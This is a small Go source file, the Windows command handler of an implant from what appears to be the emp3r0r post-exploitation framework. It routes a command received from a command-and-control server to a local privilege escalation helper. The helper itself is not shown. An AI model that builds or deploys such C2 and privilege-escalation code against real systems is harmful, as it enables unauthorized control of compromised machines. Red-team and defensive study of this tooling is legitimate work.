//go:build windows
// +build windows

package agent

import (
	"fmt"
	"log"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

func platformC2CommandsHandler(cmdSlice []string) (out string) {
	switch cmdSlice[0] {
	case emp3r0r_data.C2CmdLPE:
		// LPE helper
		// !lpe script_name
		if len(cmdSlice) < 2 {
			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
			log.Printf(out)
			return
		}

		helper := cmdSlice[1]
		out = runLPEHelper(helper)
		return
	}

	return fmt.Sprintf("Unknown command %v", cmdSlice)
}
